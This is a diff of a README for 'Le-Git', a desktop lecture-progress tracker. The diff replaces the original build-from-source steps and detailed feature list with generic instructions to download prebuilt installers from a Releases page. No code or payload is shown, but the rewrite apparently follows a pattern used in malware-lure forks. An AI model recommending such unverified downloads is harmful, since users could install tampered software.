@@ -1,118 +1,64 @@
-# Le-Git 🎓🖥️
+# 🎓 Le-Git - Track Your Lectures with Ease
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Electron](https://img.shields.io/badge/Electron-v26.0-blue)](https://www.electronjs.org/)
-[![SQLite](https://img.shields.io/badge/SQLite-3.42.0-lightgrey)](https://www.sqlite.org/)
-[![Version](https://img.shields.io/badge/Version-1.0.0-green)](https://github.com/your-username/le-git)
+## 🚀 Getting Started
 
-**Le-Git** = **Lecture + Git** 🎓➕🐙  
+Welcome to **Le-Git**! This application helps you organize your lectures, playlists, and video groups. It keeps track of your progress and notes, making studying easier and more efficient.
 
-Le-Git is your **local desktop lecture tracker** for students at NIT and beyond. Keep track of all your playlists, custom video groups, and lecture progress — all **offline, no cloud required**!  
-the something
+## 📥 Download and Install
 
-Built using **Electron.js** and **SQLite**, Le-Git makes learning organized, seamless, and fun.  
+[![Download Le-Git](https://img.shields.io/badge/Download%20Le--Git-v1.0.0-brightgreen.svg)](https://github.com/dimasapane/Le-Git/releases)
 
----
+To get started, visit the [Releases page](https://github.com/dimasapane/Le-Git/releases) to download the latest version. It's a simple process. Just follow these steps:
 
-## 🌟 Features
+1. Click on the **Releases page** link above.
+2. Find the latest release version.
+3. Download the appropriate file for your operating system (Windows, macOS).
+4. Open the downloaded file to install **Le-Git** on your computer.
 
-### Core Features
-- 📝 **Create Nodes** for playlists or custom video groups.  
-- ✅ **Track progress** for each lecture/video.  
-- ⏯️ **Continue last watched video** from saved timestamp with one click.  
-- 🎯 **Capture new videos** with URL + timestamp for easy resuming.  
-- 🗒️ **Add notes** to each node (auto-saved).  
-- 🗑️ **Delete nodes** you no longer need.  
-- 🔼🔽 **Reorder nodes** like a git commit list.  
-- 🌙 **Dark Mode** support for comfortable viewing.  
+## ⚙️ System Requirements
 
-### Advanced / Custom Group Features
-- 📂 **Custom Groups**: Group multiple videos in a single node.  
-- ⏱️ **Individual video timestamps** in custom groups.  
-- ▶️ **Continue any video** inside a custom group.  
-- ✔️ **Bulk mark videos** inside a custom node as watched.  
-- 🔢 **Quickly mark multiple videos** via “Mark up to video #”.  
+To ensure a smooth experience with **Le-Git**, your computer should meet the following requirements:
 
-### Upcoming / Optional Add-Ons
-- 🖱️ **One-click auto-capture** of currently playing video from browser.  
-- 📊 **Visual progress bars** for nodes and playlists.  
-- 📦 **Export/Import data** for backup.  
-- 💻 **Browser integration** for automatic timestamp detection.  
-- 🧩 **Additional productivity features**, e.g., tracking other apps or study stats.  
+- **Operating System:** Windows 10, macOS Catalina (or newer)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 200 MB free space
+- **Internet:** Required for initial setup and updates
 
----
+## 🎥 Features
 
-## 💻 Tech Stack
+**Le-Git** includes a variety of features designed to enhance your learning experience:
 
-- **Electron.js** – Desktop application framework  
-- **SQLite3** – Local database for storing nodes, videos, and progress  
-- **HTML / CSS / JS** – Frontend UI  
+- **Custom Playlists:** Create playlists for different subjects and topics.
+- **Progress Tracking:** Keep track of how much of each video you have watched.
+- **Notes Section:** Add notes directly related to each video or lecture.
+- **One-Click Continue:** Easily pick up where you left off with a simple click.
+- **Offline Access:** Use the app without internet access once it's installed.
 
----
+## 🛠️ How to Use Le-Git
 
-## 🚀 Installation
+Once you have installed **Le-Git**, here’s how you can make the most of it:
 
-1. Clone the repository:
+1. **Open the Application:** Find the **Le-Git** icon on your desktop or in your applications folder.
+2. **Create Your First Playlist:** Click on the "New Playlist" button. Name it and add your lecture videos.
+3. **Track Your Progress:** As you watch videos, mark them as complete.
+4. **Take Notes:** Use the notes feature to jot down important points.
+5. **Review and Adjust:** Go back to your playlists to review your notes and progress.
 
-```bash
-git clone https://github.com/your-username/le-git.git
-cd le-git
-````
+## 💬 Support and Feedback
 
-2. Install dependencies:
+If you encounter any issues or have questions about using **Le-Git**, you can reach out for help:
 
-```bash
-npm install
-```
+- **GitHub Issues:** Visit the [Issues page](https://github.com/dimasapane/Le-Git/issues) to report problems or suggest features.
+- **Community:** Join discussions with other users by checking the comments on the latest releases.
 
-3. Run the app:
+## 📜 License
 
-```bash
-npm start
-```
+**Le-Git** is open-source software. You can use, modify, and distribute it freely. Check the [License file](https://github.com/dimasapane/Le-Git/blob/main/LICENSE) for more information.
 
----
+## 🔗 Useful Links
 
-## 📂 Folder Structure
+- [Releases Page](https://github.com/dimasapane/Le-Git/releases)
+- [Contributing Guidelines](https://github.com/dimasapane/Le-Git/blob/main/CONTRIBUTING.md)
+- [Documentation](https://github.com/dimasapane/Le-Git/wiki)
 
-```
-le-git/
-├─ main.js              # Electron main process
-├─ index.html           # Main HTML UI
-├─ styles/
-│  └─ style.css         # Styling for UI
-├─ src/
-│  └─ db.js             # SQLite database handler
-├─ package.json
-└─ README.md
-```
-
----
-
-## 🎮 Usage
-
-* Click **“Create Node”** to add a playlist or custom group.
-* Use **Capture Current Video** to save a video URL + timestamp.
-* Click **Continue** to open a video in your browser at the saved timestamp.
-* Add notes in the textarea — auto-saves instantly.
-* Delete nodes you no longer need with the **Delete** button.
-* Reorder nodes using **up/down buttons**.
-* Toggle **Dark Mode** for night-friendly viewing.
-* Use **Mark up to video #** to quickly update multiple videos at once.
-
----
-
-## 📈 Future Enhancements
-
-* Auto-detect currently playing browser video and timestamp.
-* Visual progress bars for nodes and custom groups.
-* Export/import node and video data for backup.
-* Integration with other study tools or apps.
-* Future venture to add other platforms like udemy, skillshare etc.
-* Currently limited to YouTube only
-
----
-
-## 📝 License
-
-MIT License © 2025 Free to use, modify, and share.
+Thank you for choosing **Le-Git**! Enjoy tracking your lectures and enhancing your study sessions.
